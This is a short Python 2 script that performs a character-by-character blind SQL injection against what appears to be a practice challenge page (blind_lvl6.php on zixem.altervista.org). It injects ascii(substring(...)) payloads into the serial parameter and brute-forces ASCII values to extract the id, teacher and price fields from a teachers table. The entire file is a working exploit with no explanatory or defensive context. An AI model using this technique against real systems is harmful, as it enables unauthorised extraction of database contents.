#!/usr/bin/python

import pycurl, StringIO
import urllib
import re

i = 32
j = 1
k = 0
guess = ""
column = 'id'

url = 'http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10'

c = pycurl.Curl()
c.setopt(pycurl.USERAGENT, 'Mozilla/5.0')

while k<3:
	payload = ' and ascii(substring((select ' + column + ' from teachers limit 1,1),' + str(j) + ',1))='
	url_payload = urllib.quote_plus(payload + str(i))
	c.setopt(pycurl.URL, url + url_payload)
	b = StringIO.StringIO()
	c.setopt(pycurl.WRITEFUNCTION, b.write)
	c.setopt(pycurl.FOLLOWLOCATION, 1)
	c.setopt(pycurl.MAXREDIRS, 5)
	c.perform()
	content = b.getvalue()
	m = re.search(r'<u>Teacher:</u> \.{24}(.+)<br/><u>Age', content, re.M|re.I)
	if m:
		guess = guess + chr(i)
		print "[+] " + guess
		j = j + 1
		i = 32
	else:
		i = i + 1
		if i > 127:
			i = 32
			j = 1
			if k == 0:
				serial = guess
				column = 'teacher'
			elif k == 1:
				teacher = guess
				column = 'price'
			elif k == 2:
				price = guess
				break
			guess = ""
			k = k + 1

print "[+] Serial: " + serial
print "[+] Teacher: " + teacher
print "[+] Price: " + price